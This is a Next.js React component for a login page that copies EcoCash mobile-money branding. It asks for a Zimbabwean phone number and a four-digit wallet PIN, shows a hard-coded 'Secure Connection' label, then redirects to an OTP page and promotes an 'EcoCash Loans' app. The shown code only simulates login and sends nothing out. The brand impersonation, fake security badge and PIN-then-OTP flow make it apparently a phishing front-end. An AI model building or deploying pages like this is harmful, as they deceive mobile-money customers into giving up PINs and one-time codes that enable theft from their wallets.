"use client"

import type React from "react"
import Link from "next/link"
import { useState } from "react"
import { Eye, EyeOff, Home } from "lucide-react"
import { Button } from "@/components/ui/button"

export default function EcoCashLoginPage() {
  const [phone, setPhone] = useState("")
  const [pin, setPin] = useState(["", "", "", ""])
  const [showPin, setShowPin] = useState(false)
  const [loading, setLoading] = useState(false)

  const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let value = e.target.value.replace(/\D/g, "")
    if (value.length > 13) value = value.slice(0, 13)

    if (value.startsWith("263")) {
      setPhone("+263 " + value.slice(3))
    } else if (value.startsWith("0")) {
      setPhone("+263 " + value.slice(1))
    } else {
      setPhone("+263 " + value)
    }
  }

  const handlePinChange = (index: number, value: string) => {
    if (!/^\d*$/.test(value)) return

    const newPin = [...pin]
    newPin[index] = value.slice(-1)
    setPin(newPin)

    // Auto-focus next input
    if (value && index < 3) {
      const nextInput = document.getElementById(`pin-${index + 1}`)
      nextInput?.focus()
    }
  }

  const handlePinKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === "Backspace" && !pin[index] && index > 0) {
      const prevInput = document.getElementById(`pin-${index - 1}`)
      prevInput?.focus()
    }
  }

  const handleLogin = (e: React.FormEvent) => {
    e.preventDefault()
    if (!phone || pin.some((p) => !p)) {
      alert("Please enter phone number and PIN")
      return
    }

    setLoading(true)
    // Simulate login and redirect to OTP verification
    setTimeout(() => {
      // Redirect to OTP verification page
      window.location.href = "/login/otp"
      setLoading(false)
    }, 1000)
  }

  return (
    <div className="min-h-screen bg-white flex flex-col">
      {/* Top Bar */}
      <div className="bg-white border-b border-gray-200 px-6 py-3 flex items-center justify-between">
        <Link
          href="/"
          className="flex items-center gap-2 text-blue-600 hover:text-blue-700 font-semibold transition-colors"
        >
          <Home className="w-5 h-5" />
          Home
        </Link>
        <div className="text-sm text-green-500 font-semibold">Secure Connection</div>
      </div>

      {/* Main Content */}
      <div className="flex-1 flex flex-col items-center justify-center px-6 py-12">
        {/* Logo */}
        <div className="mb-12 text-center">
          <h1 className="text-5xl font-black">
            <span className="text-blue-600">Eco</span>
            <span className="text-red-600">Cash</span>
          </h1>
        </div>

        {/* Login Section */}
        <div className="w-full max-w-md">
          <h2 className="text-3xl font-bold text-gray-900 text-center mb-10">Login</h2>

          <form onSubmit={handleLogin} className="space-y-6">
            {/* Phone Number Input */}
            <div>
              <div className="relative">
                <div className="absolute left-4 top-1/2 transform -translate-y-1/2 flex items-center gap-2 pointer-events-none">
                  <span className="text-xl">🇿🇼</span>
                  <span className="text-gray-700 font-semibold">+263</span>
                </div>
                <input
                  type="tel"
                  placeholder="77 123 4567"
                  value={phone.replace("+263 ", "")}
                  onChange={handlePhoneChange}
                  className="w-full pl-24 pr-4 py-4 text-lg border-2 border-blue-500 rounded-xl focus:outline-none focus:ring-2 focus:ring-blue-300 placeholder-gray-400"
                />
              </div>
            </div>

            {/* PIN Entry Section */}
            <div className="mt-10">
              <h3 className="text-blue-600 font-bold text-center mb-2 text-lg">Secure PIN Entry</h3>
              <p className="text-gray-600 text-center text-sm mb-6">Enter your 4-digit EcoCash PIN</p>

              <div className="flex justify-center gap-4 mb-6">
                {pin.map((digit, index) => (
                  <input
                    key={index}
                    id={`pin-${index}`}
                    type={showPin ? "text" : "password"}
                    value={digit}
                    onChange={(e) => handlePinChange(index, e.target.value)}
                    onKeyDown={(e) => handlePinKeyDown(index, e)}
                    maxLength={1}
                    className="w-16 h-16 text-3xl font-bold text-center border-2 border-gray-300 rounded-2xl focus:outline-none focus:border-blue-600 focus:ring-2 focus:ring-blue-200"
                  />
                ))}
              </div>

              <button
                type="button"
                onClick={() => setShowPin(!showPin)}
                className="flex items-center justify-center gap-2 text-blue-600 font-semibold hover:text-blue-700 mx-auto transition-colors"
              >
                {showPin ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
                {showPin ? "Hide PIN" : "Show PIN"}
              </button>

              <div className="text-center mt-4">
                <a href="#" className="text-blue-600 hover:text-blue-700 font-semibold text-sm">
                  Forgot PIN?
                </a>
              </div>
            </div>

            {/* Login Button */}
            <Button
              type="submit"
              disabled={loading}
              className="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-4 text-lg rounded-xl transition-all"
            >
              {loading ? "Logging in..." : "Login"}
            </Button>
          </form>
        </div>
      </div>

      {/* Wavy Divider */}
      <svg viewBox="0 0 1200 120" preserveAspectRatio="none" className="w-full h-24" style={{ marginBottom: "-1px" }}>
        <path d="M0,50 Q300,0 600,50 T1200,50 L1200,120 L0,120 Z" fill="#1e40af" />
      </svg>

      {/* Blue Section with App Promotion */}
      <div className="bg-blue-600 text-white px-6 py-10">
        <div className="max-w-md mx-auto text-center">
          <p className="text-sm opacity-90 mb-6">To register an EcoCash wallet or get assistance, click below</p>

          <div className="bg-gradient-to-br from-purple-400 to-purple-600 rounded-2xl p-8">
            <div className="flex justify-center gap-4 mb-4 opacity-70">
              <div className="w-6 h-6 bg-white rounded-full" />
              <div className="w-6 h-6 bg-white rounded-full" />
              <div className="w-6 h-6 bg-white rounded-full" />
            </div>

            <h3 className="text-xl font-bold mb-2">Install EcoCash Loans</h3>
            <p className="text-sm opacity-90 mb-6">Add to your home screen for quick access and better experience</p>

            <Button className="w-full bg-white text-purple-600 hover:bg-gray-100 font-bold py-3 rounded-xl transition-all">
              Install App
            </Button>
          </div>
        </div>
      </div>
    </div>
  )
}
